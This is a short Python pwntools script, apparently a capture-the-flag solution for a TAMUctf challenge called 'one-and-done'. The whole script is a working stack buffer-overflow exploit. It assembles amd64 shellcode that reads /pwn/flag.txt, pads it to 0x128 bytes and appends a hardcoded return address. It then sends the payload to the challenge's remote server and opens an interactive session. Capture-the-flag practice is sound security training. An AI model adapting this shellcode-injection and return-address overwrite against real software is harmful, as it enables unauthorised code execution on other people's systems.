from pwn import *
import binascii

context.arch='amd64'
shellcode = asm(pwnlib.shellcraft.amd64.linux.cat('/pwn/flag.txt'))

pad_len = 0x128 -len(shellcode)
payload = shellcode + b'a'*pad_len + p64(0x405448) 
#payload = shellcode + b'a'*pad_len + p64(0x40138c)  
print(binascii.hexlify(bytearray(payload)))
#p = process('./one-and-done')
#input()
#p.sendline(payload)

p = remote("tamuctf.com", 443, ssl=True, sni="one-and-done")
p.sendline(payload)

p.interactive()
